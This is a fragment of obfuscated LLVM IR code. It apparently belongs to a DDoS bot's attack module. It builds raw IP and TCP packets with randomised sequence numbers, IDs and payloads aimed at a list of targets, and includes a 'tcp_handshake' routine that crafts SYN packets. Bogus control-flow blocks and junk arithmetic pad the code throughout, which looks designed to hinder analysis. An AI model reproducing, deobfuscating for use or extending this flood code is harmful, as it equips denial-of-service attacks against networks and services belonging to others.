  %828 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %829 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %828, i32 0, i32 2
  store i16 %827, i16* %829, align 2
  %830 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %831 = bitcast %struct.iphdr* %830 to i8*
  %832 = load i8, i8* %831, align 4
  %_21 = shl i8 %832, -16
  %_22 = shl i8 %832, -16
  %833 = and i8 %832, -16
  %_23 = sub i8 %833, 5
  %gen24 = mul i8 %_23, 5
  %_25 = sub i8 %833, 5
  %gen26 = mul i8 %_25, 5
  %834 = or i8 %833, 5
  store i8 %834, i8* %831, align 4
  %835 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %836 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %835, i32 0, i32 4
  store i16 0, i16* %836, align 2
  %837 = load i8, i8* %7, align 1
  %838 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %839 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %838, i32 0, i32 5
  store i8 %837, i8* %839, align 4
  %840 = load i16, i16* %17, align 2
  %841 = call zeroext i16 @htons(i16 zeroext %840) #9
  %842 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %843 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %842, i32 0, i32 3
  store i16 %841, i16* %843, align 4
  %844 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %845 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %844, i32 0, i32 6
  store i8 6, i8* %845, align 1
  %846 = load i32, i32* %19, align 4
  %847 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %848 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %847, i32 0, i32 8
  store i32 %846, i32* %848, align 4
  %849 = load %struct.arguments*, %struct.arguments** %2, align 8
  %850 = getelementptr inbounds %struct.arguments, %struct.arguments* %849, i32 0, i32 0
  %851 = load %struct.target*, %struct.target** %850, align 8
  %852 = load i32, i32* %3, align 4
  %853 = sext i32 %852 to i64
  %854 = getelementptr inbounds %struct.target, %struct.target* %851, i64 %853
  %855 = getelementptr inbounds %struct.target, %struct.target* %854, i32 0, i32 0
  %856 = load i32, i32* %855, align 4
  %857 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %858 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %857, i32 0, i32 9
  store i32 %856, i32* %858, align 4
  %859 = load i16, i16* %6, align 2
  %860 = call zeroext i16 @htons(i16 zeroext %859) #9
  %861 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %862 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %861, i32 0, i32 0
  %863 = bitcast %union.anon* %862 to %struct.anon.0*
  %864 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %863, i32 0, i32 1
  store i16 %860, i16* %864, align 2
  %865 = load i16, i16* %8, align 2
  %866 = call zeroext i16 @htons(i16 zeroext %865) #9
  %867 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %868 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %867, i32 0, i32 0
  %869 = bitcast %union.anon* %868 to %struct.anon.0*
  %870 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %869, i32 0, i32 0
  store i16 %866, i16* %870, align 4
  %871 = load i32, i32* %18, align 4
  %872 = trunc i32 %871 to i16
  %873 = call zeroext i16 @htons(i16 zeroext %872) #9
  %874 = zext i16 %873 to i32
  %875 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %876 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %875, i32 0, i32 0
  %877 = bitcast %union.anon* %876 to %struct.anon.0*
  %878 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %877, i32 0, i32 2
  store i32 %874, i32* %878, align 4
  %879 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %880 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %879, i32 0, i32 0
  %881 = bitcast %union.anon* %880 to %struct.anon.0*
  %882 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %881, i32 0, i32 4
  %883 = load i16, i16* %882, align 4
  %_27 = sub i16 %883, -241
  %gen28 = mul i16 %_27, -241
  %_29 = sub i16 %883, -241
  %gen30 = mul i16 %_29, -241
  %884 = and i16 %883, -241
  %_31 = sub i16 %884, 80
  %gen32 = mul i16 %_31, 80
  %_33 = sub i16 %884, 80
  %gen34 = mul i16 %_33, 80
  %_35 = sub i16 0, %884
  %gen36 = add i16 %_35, 80
  %_37 = sub i16 %884, 80
  %gen38 = mul i16 %_37, 80
  %_39 = shl i16 %884, 80
  %885 = or i16 %884, 80
  store i16 %885, i16* %882, align 4
  %886 = load i8, i8* %10, align 1
  %887 = sext i8 %886 to i16
  %888 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %889 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %888, i32 0, i32 0
  %890 = bitcast %union.anon* %889 to %struct.anon.0*
  %891 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %890, i32 0, i32 4
  %892 = load i16, i16* %891, align 4
  %_40 = sub i16 %887, 1
  %gen41 = mul i16 %_40, 1
  %_42 = sub i16 %887, 1
  %gen43 = mul i16 %_42, 1
  %_44 = sub i16 0, %887
  %gen45 = add i16 %_44, 1
  %_46 = shl i16 %887, 1
  %_47 = sub i16 0, %887
  %gen48 = add i16 %_47, 1
  %893 = and i16 %887, 1
  %_49 = sub i16 %893, 12
  %gen50 = mul i16 %_49, 12
  %_51 = sub i16 %893, 12
  %gen52 = mul i16 %_51, 12
  %_53 = sub i16 0, %893
  %gen54 = add i16 %_53, 12
  %_55 = sub i16 %893, 12
  %gen56 = mul i16 %_55, 12
  %894 = shl i16 %893, 12
  %_57 = sub i16 %892, -4097
  %gen58 = mul i16 %_57, -4097
  %_59 = sub i16 0, %892
  %gen60 = add i16 %_59, -4097
  %_61 = shl i16 %892, -4097
  %_62 = shl i16 %892, -4097
  %895 = and i16 %892, -4097
  %_63 = sub i16 0, %895
  %gen64 = add i16 %_63, %894
  %_65 = sub i16 %895, %894
  %gen66 = mul i16 %_65, %894
  %896 = or i16 %895, %894
  store i16 %896, i16* %891, align 4
  %897 = load i8, i8* %11, align 1
  %898 = sext i8 %897 to i16
  %899 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %900 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %899, i32 0, i32 0
  %901 = bitcast %union.anon* %900 to %struct.anon.0*
  %902 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %901, i32 0, i32 4
  %903 = load i16, i16* %902, align 4
  %_67 = sub i16 %898, 1
  %gen68 = mul i16 %_67, 1
  %_69 = sub i16 %898, 1
  %gen70 = mul i16 %_69, 1
  %904 = and i16 %898, 1
  %_71 = shl i16 %904, 8
  %_72 = sub i16 %904, 8
  %gen73 = mul i16 %_72, 8
  %905 = shl i16 %904, 8
  %906 = and i16 %903, -257
  %907 = or i16 %906, %905
  store i16 %907, i16* %902, align 4
  %908 = load i8, i8* %12, align 1
  %909 = sext i8 %908 to i16
  %910 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %911 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %910, i32 0, i32 0
  %912 = bitcast %union.anon* %911 to %struct.anon.0*
  %913 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %912, i32 0, i32 4
  %914 = load i16, i16* %913, align 4
  %915 = and i16 %909, 1
  %_74 = sub i16 %915, 13
  %gen75 = mul i16 %_74, 13
  %_76 = sub i16 0, %915
  %gen77 = add i16 %_76, 13
  %916 = shl i16 %915, 13
  %_78 = shl i16 %914, -8193
  %_79 = sub i16 0, %914
  %gen80 = add i16 %_79, -8193
  %_81 = sub i16 %914, -8193
  %gen82 = mul i16 %_81, -8193
  %_83 = sub i16 0, %914
  %gen84 = add i16 %_83, -8193
  %_85 = shl i16 %914, -8193
  %_86 = sub i16 0, %914
  %gen87 = add i16 %_86, -8193
  %_88 = shl i16 %914, -8193
  %_89 = sub i16 0, %914
  %gen90 = add i16 %_89, -8193
  %917 = and i16 %914, -8193
  %_91 = sub i16 %917, %916
  %gen92 = mul i16 %_91, %916
  %_93 = sub i16 0, %917
  %gen94 = add i16 %_93, %916
  %918 = or i16 %917, %916
  store i16 %918, i16* %913, align 4
  %919 = load i8, i8* %13, align 1
  %920 = sext i8 %919 to i16
  %921 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %922 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %921, i32 0, i32 0
  %923 = bitcast %union.anon* %922 to %struct.anon.0*
  %924 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %923, i32 0, i32 4
  %925 = load i16, i16* %924, align 4
  %_95 = sub i16 0, %920
  %gen96 = add i16 %_95, 1
  %_97 = sub i16 %920, 1
  %gen98 = mul i16 %_97, 1
  %_99 = shl i16 %920, 1
  %926 = and i16 %920, 1
  %_100 = sub i16 %926, 11
  %gen101 = mul i16 %_100, 11
  %_102 = sub i16 0, %926
  %gen103 = add i16 %_102, 11
  %_104 = sub i16 %926, 11
  %gen105 = mul i16 %_104, 11
  %_106 = sub i16 %926, 11
  %gen107 = mul i16 %_106, 11
  %927 = shl i16 %926, 11
  %928 = and i16 %925, -2049
  %_108 = sub i16 0, %928
  %gen109 = add i16 %_108, %927
  %_110 = sub i16 0, %928
  %gen111 = add i16 %_110, %927
  %929 = or i16 %928, %927
  store i16 %929, i16* %924, align 4
  %930 = load i8, i8* %14, align 1
  %931 = sext i8 %930 to i16
  %932 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %933 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %932, i32 0, i32 0
  %934 = bitcast %union.anon* %933 to %struct.anon.0*
  %935 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %934, i32 0, i32 4
  %936 = load i16, i16* %935, align 4
  %_112 = sub i16 %931, 1
  %gen113 = mul i16 %_112, 1
  %_114 = sub i16 0, %931
  %gen115 = add i16 %_114, 1
  %_116 = sub i16 %931, 1
  %gen117 = mul i16 %_116, 1
  %_118 = sub i16 0, %931
  %gen119 = add i16 %_118, 1
  %_120 = shl i16 %931, 1
  %_121 = shl i16 %931, 1
  %_122 = shl i16 %931, 1
  %937 = and i16 %931, 1
  %_123 = sub i16 %937, 10
  %gen124 = mul i16 %_123, 10
  %_125 = sub i16 %937, 10
  %gen126 = mul i16 %_125, 10
  %_127 = shl i16 %937, 10
  %_128 = shl i16 %937, 10
  %_129 = sub i16 %937, 10
  %gen130 = mul i16 %_129, 10
  %938 = shl i16 %937, 10
  %_131 = shl i16 %936, -1025
  %_132 = sub i16 %936, -1025
  %gen133 = mul i16 %_132, -1025
  %939 = and i16 %936, -1025
  %_134 = shl i16 %939, %938
  %_135 = sub i16 %939, %938
  %gen136 = mul i16 %_135, %938
  %940 = or i16 %939, %938
  store i16 %940, i16* %935, align 4
  %941 = load i8, i8* %15, align 1
  %942 = sext i8 %941 to i16
  %943 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %944 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %943, i32 0, i32 0
  %945 = bitcast %union.anon* %944 to %struct.anon.0*
  %946 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %945, i32 0, i32 4
  %947 = load i16, i16* %946, align 4
  %_137 = shl i16 %942, 1
  %_138 = sub i16 %942, 1
  %gen139 = mul i16 %_138, 1
  %_140 = sub i16 0, %942
  %gen141 = add i16 %_140, 1
  %948 = and i16 %942, 1
  %_142 = sub i16 0, %948
  %gen143 = add i16 %_142, 9
  %_144 = sub i16 %948, 9
  %gen145 = mul i16 %_144, 9
  %_146 = sub i16 %948, 9
  %gen147 = mul i16 %_146, 9
  %949 = shl i16 %948, 9
  %_148 = shl i16 %947, -513
  %_149 = shl i16 %947, -513
  %_150 = sub i16 %947, -513
  %gen151 = mul i16 %_150, -513
  %_152 = sub i16 0, %947
  %gen153 = add i16 %_152, -513
  %950 = and i16 %947, -513
  %_154 = sub i16 %950, %949
  %gen155 = mul i16 %_154, %949
  %_156 = sub i16 0, %950
  %gen157 = add i16 %_156, %949
  %_158 = sub i16 %950, %949
  %gen159 = mul i16 %_158, %949
  %_160 = sub i16 0, %950
  %gen161 = add i16 %_160, %949
  %_162 = sub i16 %950, %949
  %gen163 = mul i16 %_162, %949
  %_164 = sub i16 %950, %949
  %gen165 = mul i16 %_164, %949
  %_166 = sub i16 %950, %949
  %gen167 = mul i16 %_166, %949
  %951 = or i16 %950, %949
  store i16 %951, i16* %946, align 4
  %952 = call i32 @rand_new()
  %_168 = sub i32 %952, 65535
  %gen169 = mul i32 %_168, 65535
  %_170 = shl i32 %952, 65535
  %_171 = shl i32 %952, 65535
  %_172 = shl i32 %952, 65535
  %953 = and i32 %952, 65535
  %954 = trunc i32 %953 to i16
  %955 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %956 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %955, i32 0, i32 0
  %957 = bitcast %union.anon* %956 to %struct.anon.0*
  %958 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %957, i32 0, i32 5
  store i16 %954, i16* %958, align 2
  %959 = load i32, i32* %20, align 4
  %960 = trunc i32 %959 to i16
  %961 = call zeroext i16 @htons(i16 zeroext %960) #9
  %962 = zext i16 %961 to i32
  %963 = load %struct.tcphdr*, %struct.tcphdr** %25, align 8
  %964 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %963, i32 0, i32 0
  %965 = bitcast %union.anon* %964 to %struct.anon.0*
  %966 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %965, i32 0, i32 3
  store i32 %962, i32* %966, align 4
  %967 = load i8*, i8** %26, align 8
  %968 = load i16, i16* %5, align 2
  %969 = zext i16 %968 to i32
  call void @rand_string(i8* %967, i32 %969)
  br label %originalBB10

originalBB176alteredBB:                           ; preds = %originalBB176, %493
  store i32 0, i32* %3, align 4
  br label %originalBB176

originalBB180alteredBB:                           ; preds = %originalBB180, %510
  %970 = load i32, i32* %3, align 4
  %971 = load %struct.arguments*, %struct.arguments** %2, align 8
  %972 = getelementptr inbounds %struct.arguments, %struct.arguments* %971, i32 0, i32 3
  %973 = load i8, i8* %972, align 1
  %974 = zext i8 %973 to i32
  %975 = icmp slt i32 %970, %974
  br label %originalBB180

originalBB184alteredBB:                           ; preds = %originalBB184, %533
  %976 = load i8**, i8*** %9, align 8
  %977 = load i32, i32* %3, align 4
  %978 = sext i32 %977 to i64
  %979 = getelementptr inbounds i8*, i8** %976, i64 %978
  %980 = load i8*, i8** %979, align 8
  %981 = bitcast i8* %980 to %struct.iphdr*
  store %struct.iphdr* %981, %struct.iphdr** %27, align 8
  %982 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %983 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %982, i64 1
  %984 = bitcast %struct.iphdr* %983 to %struct.tcphdr*
  store %struct.tcphdr* %984, %struct.tcphdr** %28, align 8
  %985 = load %struct.arguments*, %struct.arguments** %2, align 8
  %986 = getelementptr inbounds %struct.arguments, %struct.arguments* %985, i32 0, i32 0
  %987 = load %struct.target*, %struct.target** %986, align 8
  %988 = load i32, i32* %3, align 4
  %989 = sext i32 %988 to i64
  %990 = getelementptr inbounds %struct.target, %struct.target* %987, i64 %989
  %991 = getelementptr inbounds %struct.target, %struct.target* %990, i32 0, i32 1
  %992 = load i16, i16* %991, align 4
  %993 = zext i16 %992 to i32
  %994 = icmp slt i32 %993, 32
  br label %originalBB184

originalBB188alteredBB:                           ; preds = %originalBB188, %626
  %995 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %996 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %995, i32 0, i32 0
  %997 = bitcast %union.anon* %996 to %struct.anon.0*
  %998 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %997, i32 0, i32 0
  %999 = load i16, i16* %998, align 4
  %1000 = zext i16 %999 to i32
  %1001 = icmp eq i32 %1000, 65535
  br label %originalBB188

originalBB192alteredBB:                           ; preds = %originalBB192, %679
  %1002 = call i32 @rand_new()
  %_193 = shl i32 %1002, 65535
  %_194 = shl i32 %1002, 65535
  %_195 = shl i32 %1002, 65535
  %_196 = sub i32 %1002, 65535
  %gen197 = mul i32 %_196, 65535
  %1003 = and i32 %1002, 65535
  %1004 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %1005 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %1004, i32 0, i32 0
  %1006 = bitcast %union.anon* %1005 to %struct.anon.0*
  %1007 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %1006, i32 0, i32 3
  store i32 %1003, i32* %1007, align 4
  br label %originalBB192

originalBB201alteredBB:                           ; preds = %originalBB201, %765
  br label %originalBB201
}

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @tcp_handshake(i16 zeroext, i32, i32, i32, i32) #0 {
  %6 = load i32, i32* @x.21
  %7 = load i32, i32* @y.22
  %8 = sub i32 %6, 1
  %9 = mul i32 %6, %8
  %10 = urem i32 %9, 2
  %11 = icmp eq i32 %10, 0
  %12 = icmp slt i32 %7, 10
  %13 = or i1 %11, %12
  br i1 %13, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %5
  %14 = alloca i32, align 4
  %15 = alloca i16, align 2
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca [40 x i8], align 16
  %25 = alloca [40 x i8], align 16
  %26 = alloca [512 x i8], align 16
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.tcphdr*, align 8
  %29 = alloca %struct.sockaddr_in, align 4
  %30 = alloca i32, align 4
  %31 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %32 = alloca i32, align 4
  %33 = alloca %struct.timeval, align 8
  %34 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %35 = alloca i32, align 4
  %36 = alloca i32, align 4
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i16 %0, i16* %15, align 2
  store i32 %1, i32* %16, align 4
  store i32 %2, i32* %17, align 4
  store i32 %3, i32* %18, align 4
  store i32 %4, i32* %19, align 4
  store i32 64, i32* %20, align 4
  store i32 5, i32* %21, align 4
  store i32 4, i32* %22, align 4
  %38 = call i32 @rand_new()
  %39 = and i32 %38, 65535
  store i32 %39, i32* %23, align 4
  %40 = bitcast [40 x i8]* %24 to i8*
  call void @llvm.memset.p0i8.i64(i8* %40, i8 0, i64 40, i32 16, i1 false)
  %41 = bitcast [40 x i8]* %25 to i8*
  call void @llvm.memset.p0i8.i64(i8* %41, i8 0, i64 40, i32 16, i1 false)
  %42 = bitcast [512 x i8]* %26 to i8*
  call void @llvm.memset.p0i8.i64(i8* %42, i8 0, i64 512, i32 16, i1 false)
  store i32 0, i32* %30, align 4
  %43 = getelementptr inbounds [40 x i8], [40 x i8]* %24, i32 0, i32 0
  %44 = bitcast i8* %43 to %struct.iphdr*
  store %struct.iphdr* %44, %struct.iphdr** %27, align 8
  %45 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %46 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %45, i64 1
  %47 = bitcast %struct.iphdr* %46 to %struct.tcphdr*
  store %struct.tcphdr* %47, %struct.tcphdr** %28, align 8
  %48 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %49 = bitcast %struct.iphdr* %48 to i8*
  %50 = load i8, i8* %49, align 4
  %51 = and i8 %50, -16
  %52 = or i8 %51, 5
  store i8 %52, i8* %49, align 4
  %53 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %54 = bitcast %struct.iphdr* %53 to i8*
  %55 = load i8, i8* %54, align 4
  %56 = and i8 %55, 15
  %57 = or i8 %56, 64
  store i8 %57, i8* %54, align 4
  %58 = call zeroext i16 @htons(i16 zeroext 40) #9
  %59 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %60 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %59, i32 0, i32 2
  store i16 %58, i16* %60, align 2
  %61 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %62 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %61, i32 0, i32 5
  store i8 64, i8* %62, align 4
  %63 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %64 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %63, i32 0, i32 6
  store i8 6, i8* %64, align 1
  %65 = load i16, i16* %15, align 2
  %66 = call zeroext i16 @htons(i16 zeroext %65) #9
  %67 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %68 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %67, i32 0, i32 0
  %69 = bitcast %union.anon* %68 to %struct.anon.0*
  %70 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %69, i32 0, i32 1
  store i16 %66, i16* %70, align 2
  %71 = load i32, i32* %19, align 4
  %72 = trunc i32 %71 to i16
  %73 = call zeroext i16 @htons(i16 zeroext %72) #9
  %74 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %75 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %74, i32 0, i32 0
  %76 = bitcast %union.anon* %75 to %struct.anon.0*
  %77 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %76, i32 0, i32 0
  store i16 %73, i16* %77, align 4
  %78 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %79 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %78, i32 0, i32 0
  %80 = bitcast %union.anon* %79 to %struct.anon.0*
  %81 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %80, i32 0, i32 4
  %82 = load i16, i16* %81, align 4
  %83 = and i16 %82, -241
  %84 = or i16 %83, 80
  store i16 %84, i16* %81, align 4
  %85 = call i32 @rand_new()
  %86 = and i32 %85, 65535
  %87 = trunc i32 %86 to i16
  %88 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %89 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %88, i32 0, i32 0
  %90 = bitcast %union.anon* %89 to %struct.anon.0*
  %91 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %90, i32 0, i32 5
  store i16 %87, i16* %91, align 2
  %92 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %93 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %92, i32 0, i32 0
  %94 = bitcast %union.anon* %93 to %struct.anon.0*
  %95 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %94, i32 0, i32 4
  %96 = load i16, i16* %95, align 4
  %97 = and i16 %96, -4097
  store i16 %97, i16* %95, align 4
  %98 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %99 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %98, i32 0, i32 0
  %100 = bitcast %union.anon* %99 to %struct.anon.0*
  %101 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %100, i32 0, i32 4
  %102 = load i16, i16* %101, align 4
  %103 = and i16 %102, -257
  store i16 %103, i16* %101, align 4
  %104 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %105 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %104, i32 0, i32 0
  %106 = bitcast %union.anon* %105 to %struct.anon.0*
  %107 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %106, i32 0, i32 4
  %108 = load i16, i16* %107, align 4
  %109 = and i16 %108, -8193
  store i16 %109, i16* %107, align 4
  %110 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %111 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %110, i32 0, i32 0
  %112 = bitcast %union.anon* %111 to %struct.anon.0*
  %113 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %112, i32 0, i32 4
  %114 = load i16, i16* %113, align 4
  %115 = and i16 %114, -2049
  store i16 %115, i16* %113, align 4
  %116 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %117 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %116, i32 0, i32 0
  %118 = bitcast %union.anon* %117 to %struct.anon.0*
  %119 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %118, i32 0, i32 4
  %120 = load i16, i16* %119, align 4
  %121 = and i16 %120, -1025
  store i16 %121, i16* %119, align 4
  %122 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %123 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %122, i32 0, i32 0
  %124 = bitcast %union.anon* %123 to %struct.anon.0*
  %125 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %124, i32 0, i32 4
  %126 = load i16, i16* %125, align 4
  %127 = and i16 %126, -513
  %128 = or i16 %127, 512
  store i16 %128, i16* %125, align 4
  %129 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %130 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %129, i32 0, i32 0
  %131 = bitcast %union.anon* %130 to %struct.anon.0*
  %132 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %131, i32 0, i32 3
  store i32 0, i32* %132, align 4
  %133 = call i32 @rand_new()
  %134 = and i32 %133, 65535
  %135 = trunc i32 %134 to i16
  %136 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %137 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %136, i32 0, i32 3
  store i16 %135, i16* %137, align 4
  %138 = load i32, i32* %18, align 4
  %139 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %140 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %139, i32 0, i32 8
  store i32 %138, i32* %140, align 4
  %141 = load i32, i32* %17, align 4
  %142 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 9
  store i32 %141, i32* %143, align 4
  %144 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 7
  store i16 0, i16* %145, align 2
  %146 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %147 = bitcast %struct.iphdr* %146 to i16*
  %148 = call zeroext i16 @checksum_generic(i16* %147, i32 20)
  %149 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %150 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %149, i32 0, i32 7
  store i16 %148, i16* %150, align 2
  %151 = call i32 @rand_new()
  %152 = and i32 %151, 65535
  %153 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %154 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %153, i32 0, i32 0
  %155 = bitcast %union.anon* %154 to %struct.anon.0*
  %156 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %155, i32 0, i32 2
  store i32 %152, i32* %156, align 4
  %157 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %158 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon* %158 to %struct.anon.0*
  %160 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %159, i32 0, i32 6
  store i16 0, i16* %160, align 4
  %161 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %162 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %163 = bitcast %struct.tcphdr* %162 to i8*
  %164 = call zeroext i16 @htons(i16 zeroext 20) #9
  %165 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %161, i8* %163, i16 zeroext %164, i32 20)
  %166 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %167 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %166, i32 0, i32 0
  %168 = bitcast %union.anon* %167 to %struct.anon.0*
  %169 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %168, i32 0, i32 6
  store i16 %165, i16* %169, align 4
  %170 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 0
  store i16 2, i16* %170, align 4
  %171 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %172 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %171, i32 0, i32 0
  %173 = bitcast %union.anon* %172 to %struct.anon.0*
  %174 = getelementptr inbounds %struct.anon.0, %struct.anon.0* %173, i32 0, i32 1
  %175 = load i16, i16* %174, align 2
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 1
  store i16 %175, i16* %176, align 2
  %177 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %178 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %177, i32 0, i32 9
  %179 = load i32, i32* %178, align 4
  %180 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %29, i32 0, i32 2
  %181 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %180, i32 0, i32 0
  store i32 %179, i32* %181, align 4
  %182 = getelementptr inbounds [40 x i8], [40 x i8]* %25, i32 0, i32 0
  %183 = getelementptr inbounds [40 x i8], [40 x i8]* %24, i32 0, i32 0
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %182, i8* %183, i64 40, i32 16, i1 false)
  %184 = load %struct.tcphdr*, %struct.tcphdr** %28, align 8
  %185 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %184, i32 0, i32 0
  %186 = bitcast %union.anon* %185 to %struct.anon.0*
